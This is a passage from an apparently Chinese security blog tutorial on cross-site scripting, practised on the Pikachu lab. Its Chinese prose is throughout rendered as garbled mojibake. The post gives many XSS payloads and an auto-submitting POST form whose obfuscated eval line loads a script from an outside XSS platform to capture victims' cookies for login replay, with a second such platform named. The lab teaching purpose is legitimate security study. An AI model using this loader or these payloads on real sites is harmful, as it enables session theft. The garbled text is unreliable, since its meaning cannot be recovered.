<!--------------------- ËèúÂçïÊ†èÂõæÊ†áÂä†ËΩΩÂäüËÉΩüëá ----------------------->
<script>
var menulist = $(".menuicon");
var menulength = menulist.length;
for (var i = 0; i < menulength; i++) {
    var altname = menulist.eq(i).attr("alt");
    var iconurl = icondict[altname];
    if (iconurl == undefined || iconurl == '')
        continue;
    if (iconurl == 'Home') {
        menulist.eq(i).attr("src", "https://xmoct.github.io/media/images/Home.png");
menulist.eq(i).show();
} else if (iconurl == 'Archive') {
menulist.eq(i).attr("src", "https://xmoct.github.io/media/images/Archive.png");
menulist.eq(i).show();
} else if (iconurl == 'Tag') {
menulist.eq(i).attr("src", "https://xmoct.github.io/media/images/Tag.png");
menulist.eq(i).show();
} else if (iconurl == 'About') {
menulist.eq(i).attr("src", "https://xmoct.github.io/media/images/About.png");
menulist.eq(i).show();
} else if (iconurl == 'Talk') {
menulist.eq(i).attr("src", "https://xmoct.github.io/media/images/Talk.png");
menulist.eq(i).show();
} else if (iconurl == 'Friends') {
menulist.eq(i).attr("src", "https://xmoct.github.io/media/images/Friends.png");
menulist.eq(i).show();
} else if (iconurl == 'Fly') {
menulist.eq(i).attr("src", "https://xmoct.github.io/media/images/wind.png");
menulist.eq(i).show();
} else {
menulist.eq(i).attr("src", iconurl);
menulist.eq(i).show();
}
}
</script>
<!--------------------- ËèúÂçïÊ†èÂõæÊ†áÂä†ËΩΩÂäüËÉΩüëÜ ----------------------->

<script>
    //--------------------bber-onetalkÂä†ËΩΩüëá--------------------------------
    function bberonetalkLoad(){
        bberjsonurl = '';
        if ( $("#bber-talk").length > 0 ) {
        jsonUrl = bberjsonurl
        $.getJSON(jsonUrl+"?t="+Date.parse( new Date()),function(res){
        var bberHtml = ''
        $.each(res.data, function(i, item){
            d = new Date(item.date)
            date = d.getFullYear()+'/'+(d.getMonth()+1)+'/'+d.getDate() +' '+d.getHours()+':'+d.getMinutes()+':'+d.getSeconds()
            dataTime = '<span class="datatime">'+date+'</span>'
            bberHtml += '<li class="item item-'+(i+1)+'">'+dataTime+'Ôºö <a data-pjax href="https://xmoct.github.io/bber">'+item.content+'</a></li>'
        });
        $('#bber-talk').append('<span class="index-talk-icon"><svg viewBox="0 0 1024 1024" width="21" height="21"><path d="M184.32 891.667692c-12.603077 0-25.206154-2.363077-37.809231-7.876923-37.021538-14.966154-59.864615-49.624615-59.864615-89.009231v-275.692307c0-212.676923 173.292308-385.969231 385.969231-385.969231h78.76923c212.676923 0 385.969231 173.292308 385.969231 385.969231 0 169.353846-137.846154 307.2-307.2 307.2H289.083077l-37.021539 37.021538c-18.904615 18.116923-43.323077 28.356923-67.741538 28.356923zM472.615385 195.347692c-178.018462 0-322.953846 144.935385-322.953847 322.953846v275.692308c0 21.267692 15.753846 29.144615 20.48 31.507692 4.726154 2.363077 22.055385 7.876923 37.021539-7.08923l46.473846-46.473846c6.301538-6.301538 14.178462-9.452308 22.055385-9.452308h354.461538c134.695385 0 244.184615-109.489231 244.184616-244.184616 0-178.018462-144.935385-322.953846-322.953847-322.953846H472.615385z"></path><path d="M321.378462 512m-59.076924 0a59.076923 59.076923 0 1 0 118.153847 0 59.076923 59.076923 0 1 0-118.153847 0Z"></path><path d="M518.301538 512m-59.076923 0a59.076923 59.076923 0 1 0 118.153847 0 59.076923 59.076923 0 1 0-118.153847 0Z"></path><path d="M715.224615 512m-59.076923 0a59.076923 59.076923 0 1 0 118.153846 0 59.076923 59.076923 0 1 0-118.153846 0Z"></path></svg></span><ul class="talk-list">'+bberHtml+'</ul>')
        //Lately({ 'target': '#bber-talk .datatime' });
        });
        function Roll (){
        var list_li = $('.talk-list li'),cur_li = list_li.first(),last_li = list_li.last();
        last_li.after(cur_li);
        };
        setInterval(Roll,3000);
    }
    }
  //--------------------bber-onetalkÂä†ËΩΩüëÜ--------------------------------
</script>

<script>
    var ClicksideState = 1
    var cur_readingmode = false
    function readingmode(){
        if (!cur_readingmode){
            if(menupos == 'left'){
                if(ClicksideState==1)
                menu_openclose1()
            }
            $("#tab1").fadeOut(50)
            $("#bg").fadeOut(50)
            $(".navbar").fadeOut(50)
            $(".markdownIt-TOC li a").css("color","black")
            cur_readingmode = true
        }else{
            if(menupos == 'left'){
                if(ClicksideState==0)
                    menu_openclose1()
            }
            $("#tab1").fadeIn(50)
            $("#bg").fadeIn(50)
            $(".navbar").fadeIn(50)
            $(".markdownIt-TOC li a").css("color","antiquewhite")
            cur_readingmode = false  
        }
    }
</script>


<!----Â§úÈó¥Ê®°Âºèüëá-->
<script>
    var moonlightState = false
    function moonlight(){
        if(!moonlightState){
            $("#bg").fadeOut(200)
            $('body').css("background","rgba(224,255,255,0.8)")
            $(".markdownIt-TOC li a").css("color","white")
            $(".text p, .text ul").css("color","white")
            $("#articlecontent").css("color","white")
            $(".post-copyright").css("background","rgba(10,10,10,0.5)")
            $('blockquote').css("background","rgba(10,10,10,0.6)")
            $("#articlecontent").css("background","rgba(10,10,10,0.5)")
            moonlightState = true
            $(".moon").attr("src","https://xmoct.github.io/media/images/sun.png")
        }else{
            $("#bg").show()
            $(".markdownIt-TOC li a").css("color","PaleTurquoise")
            $(".text p, .text ul").css("color","rgba(0, 0, 0, 0.7)")
            $("#articlecontent").css("color","black")
            $(".post-copyright").css("background","#f9f9f9")
            $('blockquote').css("background","#eff8f0")
            $("#articlecontent").css("background","white")
            $(".moon").attr("src","https://xmoct.github.io/media/images/moon.png")
            $('body').css("background","LightCyan")
            moonlightState = false
        }
    }
</script>
<!----Â§úÈó¥Ê®°ÂºèüëÜ--></div>
            <!--------------- pcÁ´ØËèúÂçïÊ†èüëÜ ---------------->

            <!-- ----------------Â∑¶‰æßËèúÂçïÊ†èhtml üëá-------------------------------------->
            
            <div>
                <div id="tab1" class="tab">
                    <div class="bars">
                        <span></span>
                        <span></span>
                        <span></span>
                    </div>
                    <div class="close"></div>
                </div>
                <div class="col-md-1 col-lg-3"></div>
                <!-- mainÊ†áÁ≠æÔºåpjaxÊ∏≤ÊüìÊó∂Âä†ËΩΩ‰ª•‰∏ãÂÜÖÂÆπüëá -->
                <div id="main" class="col-xs-12 col-sm-12 col-md-12 col-lg-7" style="padding:0;">
                    <div class="readingmode" onclick="readingmode()">ÈòÖ</div>
                    <link rel="stylesheet" href="https://xmoct.github.io/media/css/font-awesome.css">

<body>
    <div class="allcontent" id="postdetail">
        <div class="postshow postpadding" style="padding-bottom: 0;">
            
            <div class="postdetailimg">
                <img src="https://xmoct.github.io/post-images/kua-zhan-jiao-ben-gong-ji.png" class="postimage" style="cursor:auto">
            </div>
            <div class="postinfo-detail">
                <div class="postdate"><i class="fa fa-calendar"></i>2023-07-26</div>
                <div class="poststatus postdate"><i class="fa fa-clock-o"></i> 37 min read</div>
                <div class="posttag">
                    
                    <a data-pjax href="https://xmoct.github.io/tag/5jQBvl5Eb/" class="postlink">
                        <i class="fa fa-tag"></i> WebÂÆâÂÖ®
                    </a>
                    
                </div>
            </div>
            
        <div id="articlecontent">
            <div id="texttitle" style="text-align: center">
                <h2 id="ptitle">Ë∑®Á´ôËÑöÊú¨ÊîªÂáª</h2>
                <!-- id Â∞Ü‰Ωú‰∏∫Êü•ËØ¢Êù°‰ª∂ -->
                <div id="pl" style="display:none">https://xmoct.github.io/post/kua-zhan-jiao-ben-gong-ji/</div>
                <div id="rootaddr" style="display:none">https://xmoct.github.io</div>
                
            </div>
            <div class="text ">
                <h1 id="xss">XSS</h1>
<h2 id="ÁÆÄËø∞">ÁÆÄËø∞</h2>
<p>Cross-Site Scripting ÁÆÄÁß∞‰∏∫‚ÄúCSS‚ÄùÔºå‰∏∫ÈÅøÂÖç‰∏éÂâçÁ´ØÂè†ÊàêÊ†∑ÂºèË°®ÁöÑÁº©ÂÜô&quot;CSS&quot;ÂÜ≤Á™ÅÔºåÊïÖÂèàÁß∞XSS„ÄÇÂÆÉÊòØÊåáÊÅ∂ÊÑèÊîªÂáªËÄÖÂæÄwebÈ°µÈù¢‰∏≠ÊèíÂÖ•ÊÅ∂ÊÑèscript‰ª£Á†ÅÔºåÂΩìÁî®Êà∑ÊµèËßàËØ•È°µÈù¢Êó∂ÔºåÂµåÂÖ•ÂÖ∂‰∏≠ÁöÑscript‰ª£Á†ÅË¢´ÊâßË°åÔºå‰ªéËÄåËææÂà∞ÊÅ∂ÊÑèÊîªÂáªÁî®Êà∑ÁöÑÁõÆÁöÑ</p>
<!-- more -->
<p>‰∏ÄËà¨XSSÂèØ‰ª•ÂàÜ‰∏∫Â¶Ç‰∏ãÂá†Áßç<strong>Â∏∏ËßÅÁ±ªÂûã</strong>Ôºö</p>
<ol>
<li>ÂèçÂ∞ÑÊÄßXSS;</li>
<li>Â≠òÂÇ®ÂûãXSS;</li>
<li>DOMÂûãXSS;</li>
</ol>
<!-- more -->
<h1 id="Èù∂Âú∫ÁªÉ‰π†">Èù∂Âú∫ÁªÉ‰π†</h1>
<p><code>https://github.com/xmoct/pikachu/vul/xss/xss.php</code></p>
<h2 id="ÂèçÂ∞ÑÂûãxss">ÂèçÂ∞ÑÂûãxss</h2>
<blockquote>
<p>‰∏ÄËà¨ÊòØÁî®Êà∑ËæìÂÖ•ÁöÑÂèÇÊï∞ÂÜÖÂÆπ‰ºöÁõ¥Êé•ÂõûÊòæÂú®È°µÈù¢‰∏äÔºåÈÄöËøáÊèê‰∫§urlÊù•ÊûÑÈÄ†ÊîªÂáª‰ª£Á†Å„ÄÇÂèçÂ∞ÑÂûãxssÁöÑÊîªÂáªÈúÄË¶ÅÂ∞ÜurlÂèëÈÄÅÁªôÂèóÂÆ≥ËÄÖÔºåËØ±ÂØºÂèóÂÆ≥ËÄÖÁÇπÂáªÊâç‰ºöËß¶Âèë</p>
</blockquote>
<h3 id="getÂûã">GETÂûã</h3>
<ol>
<li>Êèê‰∫§1 ÊïàÊûú</li>
<li>Êèê‰∫§ <code>&lt;script&gt;alert('Ê¨¢ËøéÊù•Âà∞XSSÂ≠¶‰π†')&lt;/script&gt;</code> ÊïàÊûú</li>
<li>Â∏∏ËßÅÂºπÁ™óÂáΩÊï∞</li>
</ol>
<blockquote>
<p>confirm()<br>
prompt()<br>
alert()</p>
</blockquote>
<ol start="4">
<li>‰ª£Á†ÅÂàÜÊûê</li>
</ol>
<ul>
<li>Â≠òÂú®Âç±Èô©ÂáΩÊï∞echo
<ul>
<li>Â≠òÂú®Âç±Èô©ÂáΩÊï∞echo</li>
</ul>
</li>
</ul>
<pre><code class="language-php">&lt;div id=&quot;xssr_main&quot;&gt;
              &lt;p class=&quot;xssr_title&quot;&gt;Which NBA player do you like?&lt;/p&gt;
              &lt;form method=&quot;get&quot;&gt;
                  &lt;input class=&quot;xssr_in&quot; type=&quot;text&quot; maxlength=&quot;20&quot; name=&quot;message&quot; /&gt;
                  &lt;input class=&quot;xssr_submit&quot; type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;submit&quot; /&gt;
              &lt;/form&gt;
              &lt;?php echo $html;?&gt;   //Âç±Èô©ÂáΩÊï∞ echo
          &lt;/div&gt;
</code></pre>
<ul>
<li>ËøΩË∏™ÂèòÈáè$html</li>
</ul>
<pre><code class="language-php">$html=''; // $html ÊòØÂèòÈáèhtml
if(isset($_GET['submit'])){  // Âà§Êñ≠ÊòØÂê¶Â≠òÂú®submit
  if(empty($_GET['message'])){  // Âà§Êñ≠ÊòØÂê¶ messageÁöÑÂÄº‰∏∫Á©∫
      $html.=&quot;&lt;p class='notice'&gt;ËæìÂÖ•'kobe'ËØïËØï-_-&lt;/p&gt;&quot;;
  }else{
      if($_GET['message']=='kobe'){ // Â¶ÇÊûúÊó∂kobe Âàôhtml =...
          $html.=&quot;&lt;p class='notice'&gt;ÊÑø‰Ω†Âíå{$_GET['message']}‰∏ÄÊ†∑ÔºåÊ∞∏ËøúÂπ¥ËΩªÔºåÊ∞∏ËøúÁÉ≠Ë°ÄÊ≤∏ËÖæÔºÅ&lt;/p&gt;&lt;img src='{$PIKA_ROOT_DIR}assets/images/nbaplayer/kobe.png' /&gt;&quot;;
      }else{   // Â¶ÇÊûú‰∏çÊòØ Âàôhtml= „ÄÇ„ÄÇ„ÄÇ
          $html.=&quot;&lt;p class='notice'&gt;who is {$_GET['message']},i don't care!&lt;/p&gt;&quot;;
      }
  }
}
</code></pre>
<h3 id="postÂûã">POSTÂûã</h3>
<ol>
<li>ÁôªÂΩïËøõÂéª</li>
<li>Ë∑üÂâçÈù¢‰∏ÄÊ†∑ÔºåÂè™‰∏çËøáËøôÈáå‰º†ÈÄíÂèÇÊï∞ÊñπÂºèÂèòÊàê‰∫Üpost</li>
<li>Âà©Áî®ÊñπÊ≥ï</li>
</ol>
<ul>
<li>ÊûÑÈÄ†html ÔºåËÆ©htmlÂÆûÁé∞Ëá™Âä®Êèê‰∫§Ë°®ÂçïÁöÑÂäüËÉΩÔºàchatgptÔºâ</li>
<li>ËÆ©ÂèóÂÆ≥ËÄÖÁÇπÂáªhtmlÈìæÊé•</li>
<li>xssÂπ≥Âè∞Ëé∑Âèñcookie Ôºå ÊõøÊç¢cookie</li>
<li>ÁôªÂΩïÊàêÂäü<br>
<strong>htmlÊ†∑‰æã</strong>Ôºö</li>
</ul>
<pre><code class="language-html">&lt;html&gt;
&lt;head&gt;
&lt;script&gt;
window.onload = function() {
document.getElementById(&quot;postsubmit&quot;).click();
}
&lt;!-- window.onload() ÊñπÊ≥ïÁî®‰∫éÂú®ÁΩëÈ°µÂä†ËΩΩÂÆåÊØïÂêéÁ´ãÂàªÊâßË°åÁöÑÊìç‰ΩúÔºåÂç≥ÂΩì HTML ÊñáÊ°£Âä†ËΩΩÂÆåÊØïÂêéÔºåÁ´ãÂàªÊâßË°åÊüê‰∏™ÊñπÊ≥ï„ÄÇ --&gt;
&lt;/script&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;form method=&quot;post&quot; action=&quot;http://127.0.0.1/pikachu/vul/xss/xsspost/xss_reflected_post.php&quot;&gt;
&lt;input id=&quot;xssr_in&quot; type=&quot;text&quot; style=&quot;display:none&quot; name=&quot;message&quot; value=
&quot;&lt;/tEXtArEa&gt;'&quot;&gt;&lt;img src=# id=xssyou style=display:none onerror=eval(unescape(/var%20b%3Ddocument.createElement%28%22script%22%29%3Bb.src%3D%22https%3A%2F%2F3s.wf%2FjvY0%22%2BMath.random%28%29%3B%28document.getElementsByTagName%28%22HEAD%22%29%5B0%5D%7C%7Cdocument.body%29.appendChild%28b%29%3B/.source));//&gt;&quot;
/&gt;
&lt;div style=&quot;display:none;&quot;&gt;&lt;input id=&quot;postsubmit&quot; type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;submit&quot; /&gt;&lt;/div&gt;
&lt;/form&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<ul>
<li>xssÂπ≥Âè∞<br>
<code>https://xss.pt/xss.php</code></li>
</ul>
<h3 id="Â≠òÂÇ®Âûãxss">Â≠òÂÇ®Âûãxss</h3>
<blockquote>
<p>ÊîªÂáªËÄÖÂ∞ÜÊûÑÈÄ†ÁöÑÊÅ∂ÊÑè‰ª£Á†Å‰º†ÂÖ•ÊúçÂä°Âô®ÔºåÂπ∂Â≠òÂÇ®Âú®ÊúçÂä°Âô®Á´ØÔºåÂú®ÂÖ∂‰ªñÁî®Êà∑‰∏ã‰∏ÄÊ¨°ËÆøÈóÆ‰∏Ä‰∏™Áúã‰ººÊ≠£Â∏∏ÁöÑËøûÊé•Êó∂ÔºåÂ∞±‰ºöËß¶ÂèëÂπ∂ÊâßË°åÊÅ∂ÊÑè‰ª£Á†Å</p>
</blockquote>
<ol>
<li>ÁïôË®Ä</li>
<li>Èó≠ÂêàÊ†áÁ≠æ<br>
<code>&lt;/p&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;p&gt;</code></li>
<li>‰ª£Á†ÅÂàÜÊûê</li>
<li>Â∞Ü‰º†ÂÖ•ÁöÑÂÄº ÂÜôËøõÊèíÂÖ•Êï∞ÊçÆÂ∫ì‰∏≠</li>
<li>‰ªéÊï∞ÊçÆÂ∫ì‰∏≠Êü•ËØ¢</li>
</ol>
<pre><code class="language-php">&lt;?php echo $html;
                  $query=&quot;select * from message&quot;; // SQL Êü•ËØ¢ËØ≠Âè•Ôºå‰ªé 'message' Ë°®‰∏≠ÈÄâÊã©ÊâÄÊúâË°å
                  $result=execute($link, $query); // ‰ΩøÁî® $link ËøûÊé•ÊâßË°åÊü•ËØ¢
                  while($data=mysqli_fetch_assoc($result)){ // ÈÅçÂéÜÊü•ËØ¢ËøîÂõûÁöÑÊØè‰∏ÄË°å
                      echo &quot;&lt;p class='con'&gt;{$data['content']}&lt;/p&gt;&lt;a href='xss_stored.php?id={$data['id']}'&gt;Âà†Èô§&lt;/a&gt;&quot;;
                  }   // ËæìÂá∫ÂΩìÂâçË°åÁöÑÂÜÖÂÆπ,ÂåÖÂê´Âú®‰∏Ä‰∏™Â∏¶ÊúâÁ±ªÂêç‰∏∫ 'con' ÁöÑÊÆµËêΩÊ†áÁ≠æ‰∏≠
</code></pre>
<h3 id="domÂûãxss">DOMÂûãxss</h3>
<blockquote>
<p>‰∏éÂèçÂ∞ÑÂûãxssÁõ∏‰ºº Ôºå‰ΩÜ‰ªñ‰∏çÊòØÊúçÂä°Á´ØÁõ¥Êé•ÂõûÊòæÂá∫JavaScript‰ª£Á†ÅÔºåËÄåÊòØÁî±‰∫éÂºÄÂèëËÄÖÂú®ÁºñÂÜôÂâçÁ´Ø‰ª£Á†ÅÊó∂ÔºåÂÜôÂú®html‰∏≠Javascript‰ª£Á†ÅÂíåÂºïÂÖ•ÁöÑJavaScriptËµÑÊ∫êÊñá‰ª∂Â≠òÂú®Áº∫Èô∑ÂØºËá¥ÁöÑ; Ëß¶ÂèëXSSÈù†ÁöÑÊòØÊµèËßàÂô®Á´ØÁöÑDOMËß£ÊûêÔºåÂèØ‰ª•ËÆ§‰∏∫ÂÆåÂÖ®ÊòØÂÆ¢Êà∑Á´ØÁöÑ‰∫ãÊÉÖ</p>
</blockquote>
<p>DOMÊ¶ÇËø∞<br>
<code>https://developer.mozilla.org/zh-CN/docs/Web/API/Document_Object_Model/Introduction</code></p>
<ol>
<li>Javacript‰º™ÂçèËÆÆ<br>
<code>javascript:alert(1)</code></li>
<li>‰ª£Á†ÅÂàÜÊûê<br>
ËøΩtext</li>
</ol>
<pre><code class="language-php">&lt;script&gt;
     function domxss(){
      // Ëé∑Âèñid‰∏∫&quot;text&quot;ÁöÑÂÖÉÁ¥†ÁöÑÂÄºÂπ∂ËµãÁªôÂèòÈáèstr
       var str = document.getElementById(&quot;text&quot;).value;
     // Â∞Ü‰∏Ä‰∏™Â∏¶ÊúâÂä®ÊÄÅÈìæÊé•ÁöÑ&lt;a&gt;Ê†áÁ≠æÁöÑHTMLÂÜÖÂÆπËµãÁªôid‰∏∫&quot;dom&quot;ÁöÑÂÖÉÁ¥†
       document.getElementById(&quot;dom&quot;).innerHTML = &quot;&lt;a href='&quot;+str+&quot;'&gt;what do you see?&lt;/a&gt;&quot;;
       }
     //ËØïËØïÔºö'&gt;&lt;img src=&quot;#&quot; onmouseover=&quot;alert('xss')&quot;&gt;
     //ËØïËØïÔºö' onclick=&quot;alert('xss')&quot;&gt;,Èó≠ÂêàÊéâÂ∞±Ë°å
&lt;/script&gt;
</code></pre>
<h2 id="xssÊºèÊ¥ûÊ£ÄÊµã">XssÊºèÊ¥ûÊ£ÄÊµã</h2>
<h3 id="ÂèçÂ∞ÑÂûã">ÂèçÂ∞ÑÂûã</h3>
<p><strong>‰º†ÁªüÊñπÊ≥ï</strong></p>
<blockquote>
<p>‰º†ÁªüÊ£ÄÊµãÊñπÊ≥ïÂç≥‰∏∫Áõ¥Êé•ÂèëÈÄÅxssÂà©Áî®‰ª£Á†ÅÁöÑÂΩ¢ÂºèÔºåÁÑ∂ÂêéÊ£ÄÊµãÈ°µÈù¢‰∏≠ÊòØÂê¶Â≠òÂú®Ë¢´Ê§çÂÖ•ÁöÑxss‰ª£Á†Å</p>
</blockquote>
<ol>
<li>ÊòØÂê¶ÂèØ‰ª•ÊèíÂÖ•<code>&lt;script&gt;Ê†áÁ≠æ</code></li>
</ol>
<pre><code class="language-php">&lt;script&gt;alert(1)&lt;/script&gt;
&lt;script&gt;a=alert;a(1)&lt;/script&gt;
&lt;script&gt;location.href=&quot;javascript:alert(2)&quot;&lt;/script&gt;
&lt;script&gt;location.href=location.hash.substr(1)&lt;/script&gt;
&lt;script&gt;location.href=location.search.sunstr(1)&lt;/script&gt;
</code></pre>
<ol start="2">
<li>ÊòØÂê¶ÂèØ‰ª•ÊèíÂÖ•‰ªªÊÑèÊ†áÁ≠æ+on‰∫ã‰ª∂ÁªÑÂêà</li>
</ol>
<pre><code class="language-php">&lt;img src=1 onerror=alert(1) &gt;
&lt;svg onload=alert(1) &gt;
&lt;input onmouseover=alert(1)&gt;
&lt;a href=&quot;x&quot; onclick=&quot;alert(1)&quot;&gt;click me&lt;/a&gt;
</code></pre>
<ol start="3">
<li>ÊòØÂê¶ÂèØ‰ª•ÊèíÂÖ•<code>&lt;iframe&gt;</code>Ê†áÁ≠æ+srcÁªÑÂêà</li>
</ol>
<pre><code class="language-php">&lt;iframe src=&quot;javascript:top.alert(1)&quot;&gt;
&lt;iframe src=&quot;java script:top.alert(1)&quot;&gt;
</code></pre>
<ol start="4">
<li>ÊòØÂê¶ÂèØ‰ª•ÊèíÂÖ•<base>Ê†áÁ≠æ+hrefÁªÑÂêà</li>
</ol>
<pre><code class="language-php">&lt;base href=&quot;http://wwww.xxxx.com/&quot;&gt;
</code></pre>
<p><strong>Ê®°Á≥äÊµãËØï</strong></p>
<blockquote>
<p>‰∏çÁõ¥Êé•ÂèëÈÄÅxss payloadÔºåËÄåÊòØÈÄöËøáÊ£ÄÊµã‰∏çÂêåÂõûÊòæÁÇπ‰ΩçÁΩÆ‰∏ãÁöÑÂÖ≥ÈîÆÂ≠óÁ¨¶ËøáÊª§ÊÉÖÂÜµÁöÑÊñπÊ≥ïÔºåË¢´Áß∞‰∏∫Ê®°Á≥äxssÊºèÊ¥ûÊ£ÄÊµãÊäÄÊúØ</p>
</blockquote>
<ol>
<li>Âà§Êñ≠ÂõûÊòæÂèÇÊï∞</li>
<li>ÂèëÈÄÅPayloadËØ∑Ê±ÇÔºàÁÆÄÂåñÁâπÊÆäÂ≠óÁ¨¶Â∫èÂàóÔºâ</li>
</ol>
<pre><code class="language-PHP"> '
''
&lt;&gt;
&lt;/script&gt;
&lt;%27&gt;
%25%27
\x27
\u0027
%22
%2522
\x22
\u0022
.....
</code></pre>
<ol start="3">
<li>
<p>Ê†πÊçÆÂõûÊòæÁÇπ‰ΩçÁΩÆÂíåËøáÊª§Â≠óÁ¨¶ÊÉÖÂÜµÁªºÂêàÂØπÊØî</p>
<ol>
<li><code>&lt;script&gt;</code> Ê†áÁ≠æÂÜÖ -- ÂèØÁõ¥Êé•ÊâßË°åJavaScript‰ª£Á†Å</li>
</ol>
<blockquote>
<ol>
<li><code>&lt;script&gt;</code>aa<code>&lt;/script&gt;</code></li>
<li>Âú®Ê†áÁ≠æon‰∫ã‰ª∂‰πãÂÜÖÔºå<code>&lt;img onerror='aa'&gt;</code></li>
<li>Âú®Javascript:‰πãÂêé,<code>&lt;iframe src=&quot;javascript:aa&quot;&gt;</code></li>
</ol>
</blockquote>
<ol start="2">
<li><code>&lt;script&gt;</code>Ê†áÁ≠æÂ§ñ ‰∏ÄËà¨‰ΩøÁî®‰∏Ä‰∏ãÊñπÊ≥ïËøõÂÖ•<code>&lt;script&gt;</code>Ê†áÁ≠æ</li>
</ol>
<blockquote>
<ol>
<li>ÂºïÂÖ•Ê†áÁ≠æÊ≥ïÔºõÂºïÂÖ•<code>&lt;script&gt;</code> Êàñ<code>&lt;img&gt;</code>Á≠âÂÖ∂‰ªñÊ†áÁ≠æon‰∫ã‰ª∂</li>
<li>ÂºïÂÖ•ÂÖÉÁ¥†Ê≥ïÔºõÂõûÊòæÁÇπÂ¶ÇÊûú‰Ωç‰∫éÊ†áÁ≠æÂÜÖÔºåÂàôÁõ¥Êé•ÂºïÂÖ•on‰∫ã‰ª∂</li>
<li>JavaScript‰º™ÂçèËÆÆÊ≥ïÔºõ<br>
<code>&lt;a href=&quot;javascript:alert(1)&quot;&gt;xx&lt;/a&gt;</code><br>
<code>&lt;iframe src=&quot;javascript:alert(1)&quot;&gt;&lt;/iframe&gt;</code></li>
</ol>
</blockquote>
</li>
</ol>
<h3 id="Â≠òÂÇ®Âûã">Â≠òÂÇ®Âûã</h3>
<blockquote>
<p>Â≠òÂÇ®Âûã‰∏éÂèçÂ∞ÑÂûãÂæàÂ§ßÁöÑÂå∫Âà´ÊòØ,ÂèçÂ∞ÑÂûãxssÁöÑÂõûÊòæÁÇπ‰∏ÄËà¨Â∞±ÊòØËØ∑Ê±ÇÊèê‰∫§ÂêéÁöÑÂìçÂ∫îÈ°µÈù¢Ôºå‰∫åÂ≠òÂÇ®ÂûãxssÁöÑÂõûÊòæÁÇπ‰∏çÂõ∫ÂÆöÔºåÊúâ‰∫õÊòØÂìçÂ∫îÈ°µÈù¢ÔºåÊúâ‰∫õÂàô‰∏çÊòØÔºà‰æãÂ¶ÇÔºöÁÆ°ÁêÜÂëòÂêéÂè∞Êü•ÁúãÔºâÔºåÊâÄ‰ª•Â≠òÂÇ®ÂûãÁöÑxssÊ£ÄÊµã‰∏ÄËà¨‰ΩøÁî®Áõ≤ÊâìÊäÄÊúØ</p>
</blockquote>
<p><strong>xssÁõ≤Êâì</strong></p>
<ol>
<li>Âú®ÂèØËÉΩÂ≠òÂú®xssÁöÑÁÇπÊèíÂÖ•payload</li>
</ol>
<blockquote>
<p>Áé∞Âú®Êú¨Âú∞Áî®pythonËµ∑‰∏Ä‰∏™httpÊúçÂä°<code> python -m http.server</code><br>
<code>&lt;script&gt;window.open('http://127.0.0.1:8000')&lt;/script&gt;</code><br>
Â¶ÇÊûúxssÂ≠òÂú®ÔºåÂàô‰ºöÊâìÂºÄÊñ∞Á™óÂè£ÔºåËÆøÈóÆ <code>http:127.0.0.1:8000</code></p>
</blockquote>
<ol start="2">
<li>ÂÅáËÆæÊàë‰ª¨Áé∞Âú®ÊòØÁÆ°ÁêÜÂëòÂéªÁúãËØÑËÆ∫</li>
<li>ÁúãÊïàÊûú<br>
Ê≠§Êó∂ ÔºåÊàë‰ª¨Âè™ÈúÄÊ£ÄÊµãÊàë‰ª¨ÂØπÊàë‰ª¨ÁöÑhttpÊúçÂä°ËøõË°åÁõëÊéßÂç≥ÂèØÂà§Êñ≠xssÊòØÂê¶Ë¢´Ëß¶Âèë<br>
‰∏ÄËà¨Âú®ÊµãËØï‰∏≠ÔºåÊàë‰ª¨‰ºöÁî®Âà∞xssÂπ≥Âè∞Êù•ËøõË°åÁõëÊéßÔºàbeef-xssÂíåËá™Âª∫xssÂπ≥Âè∞Ôºâ</li>
</ol>
<h3 id="domÂûã">DOMÂûã</h3>
<blockquote>
<p>ÊåñÊéòÈöæÂ∫¶ËæÉÂ§ß ÔºåÈúÄË¶ÅÂàÜÊûêÁΩëÁ´ôÂä†ËΩΩÁöÑJavacript‰ª£Á†Å;Ê£ÄÊü•ÁΩëÈ°µ‰∏≠‰ªª‰ΩïÂèØËÉΩÂ≠òÂú®Áº∫Èô∑ÁöÑÊîªÂáªÁÇπÔºåÂåÖÊã¨‰∏î‰∏ç‰ªÖÈôê‰∫é‰ª•‰∏ãËåÉÂõ¥</p>
</blockquote>
<pre><code class="language-PHP">docmuent
docmuent.write
docmuent.cookie
innerHTML
.html
URL
location
location.search
location.href
location.hash
window.name
postMessage
localStorage
sessionStorage
eval
call
$.getScript
</code></pre>
<p>‰æã1Ôºö</p>
<pre><code class="language-PHP">&lt;! DOCTYPE html&gt;
&lt;html lang=&quot;en&quot;&gt;

&lt;head&gt;
    &lt;meta charset=&quot;UTF-8&quot;&gt;
    &lt;title&gt;welcome&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;

&lt;/body&gt;
&lt;script&gt;
    var getUrlParam = function(name){
    //‰ΩøÁî®getUrlParam ÊñπÊ≥ïÔºå‰ªéURL‰∏≠Âèñ‰∫ÜÂêç‰∏∫usernameÁöÑÂèÇÊï∞
        var reg = new RegExp(&quot;(^|&amp;|#)&quot;+name+&quot;=([^&amp;]*)(&amp;|$)&quot;);
        var r = window.location.href.substr(1).match(reg);
        if (r != null ) return unescape(r[2]);
        return null;
    }
    //ÈÄöËøádocument.write ÂÜôÂÖ•Âà∞È°µÈù¢
    document.write(&quot;welcome,&quot;+ getUrlParam(&quot;username&quot;));

&lt;/script&gt;
&lt;/html&gt;
</code></pre>
<ol>
<li>ÂàõÂª∫‰∏Ä‰∏™Ê≠£ÂàôË°®ËææÂºèregÔºåÁî®‰∫éÂåπÈÖçURL‰∏≠ÁöÑÂèÇÊï∞ÂêçÂíåÂÄº„ÄÇ(<sup>|&amp;)Ë°®Á§∫ÂèÇÊï∞ÂêçÂâçÈù¢ÂèØ‰ª•ÊòØÂ≠óÁ¨¶‰∏≤ÁöÑÂºÄÂ§¥ÊàñËÄÖÊòØ&amp;Á¨¶Âè∑Ôºå([</sup>&amp;]*)Ë°®Á§∫ÂèÇÊï∞ÂÄºÂèØ‰ª•ÊòØ‰ªªÊÑèÂ≠óÁ¨¶Èô§‰∫Ü&amp;Ôºå(&amp;|$)Ë°®Á§∫ÂèÇÊï∞ÂÄºÂêéÈù¢ÂèØ‰ª•ÊòØ&amp;Á¨¶Âè∑ÊàñÂ≠óÁ¨¶‰∏≤ÁöÑÁªìÂ∞æ„ÄÇ</li>
